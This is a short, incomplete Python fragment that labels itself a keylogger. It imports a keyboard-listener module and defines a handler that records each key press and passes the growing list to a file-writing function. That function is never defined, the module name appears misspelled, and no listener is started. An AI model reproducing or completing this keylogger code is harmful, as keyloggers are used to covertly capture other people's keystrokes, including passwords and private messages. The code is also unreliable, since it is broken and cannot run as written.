# keylogger using pyinput module
import pyinput
from pyinput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)